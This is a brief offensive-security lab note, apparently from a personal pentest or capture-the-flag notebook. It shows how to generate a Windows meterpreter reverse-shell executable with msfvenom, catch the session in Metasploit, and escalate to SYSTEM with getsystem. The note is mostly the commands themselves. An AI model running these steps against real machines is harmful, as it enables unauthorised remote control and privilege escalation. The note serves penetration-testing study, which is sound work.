- Get a `meterpreter` sessions through `msfvenom` and `metasploit`:
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=9001 -f exe -o reverse.exe`
- Transfer the file on windows machine
- On metasploit:
	- `set payload windows/x64/meterpreter/reverse_tcp`
	- `set lhost wlan0`
	- `set lport 9001`
	- `run`
- Run the binary on windows machine:
	- `C:\Users\Public\Documents>reverse.exe`
	- Got the shell:
		- ![[Pasted image 20250326040648.png]]

# Quick win with `getsystem`

- Run `getsystem` to get admin privs (`Named Pipe Impersonation`)
	- ![[Pasted image 20250326040732.png]]
	- ![[Pasted image 20250326040921.png]]